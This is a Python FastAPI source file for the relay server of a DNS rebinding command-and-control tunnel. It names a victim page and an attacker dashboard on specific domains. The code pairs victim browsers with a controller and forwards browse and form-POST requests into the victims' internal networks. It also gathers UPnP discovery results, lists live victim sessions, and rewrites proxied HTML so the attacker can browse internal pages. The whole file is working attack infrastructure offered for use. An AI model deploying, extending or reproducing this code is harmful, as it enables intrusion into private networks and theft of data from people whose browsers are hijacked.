"""
WebSocket relay for DNS rebinding C2 tunnel.

Endpoint: GET /ws/rb/{token}?role=victim|controller

Architecture:
  - rb-launch.html (http://rb.clalitapp.info) connects as role=victim
  - Dashboard (https://clipper.clalitapp.info) connects as role=controller
  - This relay forwards raw JSON strings between the two sides by token

Message protocol (raw JSON strings, no server-side parsing needed):
  Controller→Victim: {"type":"browse_request","req_id":"<uuid>","url":"/path"}
                     {"type":"end_tunnel"}
  Victim→Controller: {"type":"browse_result","req_id":"<uuid>","url":"/path","status":200,"body":"..."}
                     {"type":"tunnel_ready"}
                     {"type":"keepalive"}
"""

import asyncio
import json
import logging
import re
import uuid
from urllib.parse import quote, urljoin, urlparse

from fastapi import APIRouter, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse, Response

logger = logging.getLogger(__name__)

router = APIRouter()

# { token: {"victim": WebSocket|None, "controller": WebSocket|None, "buffer": [str, ...], "pending_browse": {req_id: asyncio.Queue}} }
_rb_ws_sessions = {}

# UPnP results received via HTTP fallback (victim→server POST when WS not ready)
# { token: dict }
_upnp_results = {}

_BUFFER_MAX = 20


def _get_or_create_session(token):
    if token not in _rb_ws_sessions:
        _rb_ws_sessions[token] = {"victim": None, "controller": None, "buffer": [], "pending_browse": {}}
    return _rb_ws_sessions[token]


def _cleanup_session(token):
    sess = _rb_ws_sessions.get(token)
    if sess and sess["victim"] is None and sess["controller"] is None:
        del _rb_ws_sessions[token]
        logger.debug("rb_ws: cleaned up session token=%s", token)


@router.websocket("/ws/rb/{token}")
async def ws_rb_relay(websocket: WebSocket, token: str, role: str = "victim"):
    if role not in ("victim", "controller"):
        await websocket.close(code=4000)
        return

    await websocket.accept()
    logger.info("rb_ws: connected role=%s token=%s", role, token)

    sess = _get_or_create_session(token)
    peer_role = "controller" if role == "victim" else "victim"

    # Register this side
    sess[role] = websocket

    # Notify peer if already connected
    peer_ws = sess.get(peer_role)
    if peer_ws is not None:
        try:
            await peer_ws.send_text(json.dumps({"type": "peer_connected", "role": role}))
        except Exception:
            pass

    # If we are the victim, flush any buffered controller messages
    if role == "victim" and sess["buffer"]:
        for buffered_msg in sess["buffer"]:
            try:
                await websocket.send_text(buffered_msg)
            except Exception:
                break
        sess["buffer"].clear()
        logger.debug("rb_ws: flushed buffer to victim token=%s", token)

    try:
        while True:
            msg = await websocket.receive_text()
            sess = _rb_ws_sessions.get(token)
            if sess is None:
                break

            peer_ws = sess.get(peer_role)

            if role == "victim":
                # Check if this is a browse_result for a pending HTTP browse request
                try:
                    parsed = json.loads(msg)
                    if parsed.get("type") == "browse_result":
                        req_id = parsed.get("req_id")
                        pending = sess.get("pending_browse", {})
                        if req_id and req_id in pending:
                            await pending[req_id].put(parsed)
                            logger.debug("rb_ws: browse_result routed to HTTP waiter req_id=%s token=%s", req_id, token)
                except (json.JSONDecodeError, Exception):
                    pass

                # Forward victim → controller
                if peer_ws is not None:
                    try:
                        await peer_ws.send_text(msg)
                    except Exception:
                        logger.debug("rb_ws: could not forward victim msg to controller token=%s", token)
                else:
                    # Controller not connected — drop (controller is the sender of commands, not
                    # the receiver of unidirectional victim->controller data we need to buffer)
                    logger.debug("rb_ws: victim msg dropped, no controller connected token=%s", token)

            else:
                # role == "controller": forward controller → victim
                if peer_ws is not None:
                    try:
                        await peer_ws.send_text(msg)
                    except Exception:
                        logger.debug("rb_ws: could not forward controller msg to victim token=%s, buffering", token)
                        # Victim ws died mid-session; buffer it
                        if len(sess["buffer"]) < _BUFFER_MAX:
                            sess["buffer"].append(msg)
                else:
                    # Victim not connected yet — buffer up to BUFFER_MAX
                    if len(sess["buffer"]) < _BUFFER_MAX:
                        sess["buffer"].append(msg)
                        logger.debug("rb_ws: buffered controller msg token=%s buf_len=%d", token, len(sess["buffer"]))
                    else:
                        logger.debug("rb_ws: buffer full, dropping controller msg token=%s", token)

    except WebSocketDisconnect:
        pass
    except Exception as exc:
        logger.warning("rb_ws: error on role=%s token=%s: %s", role, token, exc)
    finally:
        sess = _rb_ws_sessions.get(token)
        if sess is not None:
            sess[role] = None
            logger.info("rb_ws: disconnected role=%s token=%s", role, token)

            # Notify the other side
            peer_ws = sess.get(peer_role)
            if peer_ws is not None:
                try:
                    await peer_ws.send_text(json.dumps({"type": "peer_disconnected", "role": role}))
                except Exception:
                    pass

            _cleanup_session(token)


@router.post("/rb/upnp")
async def post_upnp_result(request: Request):
    """HTTP fallback: victim posts upnp_found when WS relay not yet connected."""
    try:
        data = await request.json()
    except Exception:
        return JSONResponse({"ok": False, "error": "invalid json"}, status_code=400)

    token = data.get("token", "")
    if not token:
        return JSONResponse({"ok": False, "error": "no token"}, status_code=400)

    _upnp_results[token] = data
    logger.info("rb_ws: upnp result received via HTTP for token=%s", token)

    # Forward to controller if connected
    sess = _rb_ws_sessions.get(token)
    if sess and sess.get("controller") is not None:
        try:
            await sess["controller"].send_text(json.dumps(data))
            logger.debug("rb_ws: upnp result forwarded to controller token=%s", token)
        except Exception:
            pass

    return {"ok": True}


@router.get("/rb/upnp/{token}")
async def get_upnp_result(token: str):
    """Dashboard polls for UPnP result for a given token."""
    result = _upnp_results.get(token)
    if result is None:
        return {"ready": False}
    return {"ready": True, "result": result}


@router.get("/rb/ws-sessions")
async def get_ws_sessions():
    """Return connected WebSocket session state for all active tokens."""
    sessions = [
        {
            "token": token,
            "victim_connected": sess["victim"] is not None,
            "controller_connected": sess["controller"] is not None,
            "buffer_len": len(sess["buffer"]),
        }
        for token, sess in _rb_ws_sessions.items()
    ]
    return {"sessions": sessions}


def _rewrite_html(html: str, token: str, current_path: str) -> str:
    """Rewrite href/action/src in HTML to route through browse-ws proxy."""
    proxy_prefix = f"/api/rb/tunnel/browse-ws/{token}?path="

    def proxify(url: str) -> str:
        if not url:
            return url
        url = url.strip()
        if any(url.startswith(p) for p in ("data:", "javascript:", "mailto:", "tel:", "blob:", "#")):
            return url
        if url.startswith("//"):
            url = "http:" + url
        parsed = urlparse(url)
        if parsed.scheme in ("http", "https"):
            target = parsed.path or "/"
            if parsed.query:
                target += "?" + parsed.query
        elif url.startswith("/"):
            target = url
        else:
            base_dir = current_path.rsplit("/", 1)[0] + "/"
            target = urljoin(base_dir, url)
        return proxy_prefix + quote(target, safe="/?&=")

    def sub_attr(attr: str, m: re.Match) -> str:
        return f'{attr}="{proxify(m.group(1))}"'

    html = re.sub(r'href=["\']([^"\']*)["\']', lambda m: sub_attr("href", m), html)
    html = re.sub(r'action=["\']([^"\']*)["\']', lambda m: sub_attr("action", m), html)
    return html


async def _ws_browse(token: str, path: str, method: str = "GET", body: str = "", content_type: str = ""):
    sess = _rb_ws_sessions.get(token)
    if not sess or sess.get("victim") is None:
        return None, "no_victim"

    req_id = str(uuid.uuid4())
    q: asyncio.Queue = asyncio.Queue()
    sess["pending_browse"][req_id] = q

    msg: dict = {"type": "browse_request", "req_id": req_id, "url": path, "method": method}
    if method == "POST":
        msg["body"] = body
        msg["content_type"] = content_type or "application/x-www-form-urlencoded"

    try:
        await sess["victim"].send_text(json.dumps(msg))
        logger.info("rb_ws: browse_request %s %s req_id=%s token=%s", method, path, req_id, token)
    except Exception as exc:
        sess["pending_browse"].pop(req_id, None)
        return None, str(exc)

    try:
        result = await asyncio.wait_for(q.get(), timeout=30.0)
        return result, None
    except asyncio.TimeoutError:
        return None, "timeout"
    finally:
        sess["pending_browse"].pop(req_id, None)


@router.get("/rb/tunnel/browse-ws/{token}")
async def tunnel_browse_ws_get(token: str, path: str = "/"):
    result, err = await _ws_browse(token, path)
    if err == "no_victim":
        return HTMLResponse("<h1>No victim WS connected for this token</h1><p>Victim must be in WS tunnel mode.</p>", status_code=404)
    if err == "timeout":
        return HTMLResponse("<h1>Timeout — victim did not respond within 30s</h1>", status_code=504)
    if err:
        return HTMLResponse(f"<h1>Error: {err}</h1>", status_code=502)

    body = result.get("body") or ""
    status = result.get("status", 200)
    ct = result.get("content_type") or "text/html; charset=utf-8"

    if "text/html" in ct:
        body = _rewrite_html(body, token, path)

    return Response(content=body, status_code=status, media_type=ct)


@router.post("/rb/tunnel/browse-ws/{token}")
async def tunnel_browse_ws_post(token: str, path: str = "/", request: Request = None):
    raw_body = (await request.body()).decode("utf-8", errors="replace")
    ct = request.headers.get("content-type", "application/x-www-form-urlencoded")

    result, err = await _ws_browse(token, path, method="POST", body=raw_body, content_type=ct)
    if err == "no_victim":
        return HTMLResponse("<h1>No victim WS connected for this token</h1>", status_code=404)
    if err == "timeout":
        return HTMLResponse("<h1>Timeout</h1>", status_code=504)
    if err:
        return HTMLResponse(f"<h1>Error: {err}</h1>", status_code=502)

    body = result.get("body") or ""
    status = result.get("status", 200)
    ct_resp = result.get("content_type") or "text/html; charset=utf-8"

    if "text/html" in ct_resp:
        body = _rewrite_html(body, token, path)

    return Response(content=body, status_code=status, media_type=ct_resp)
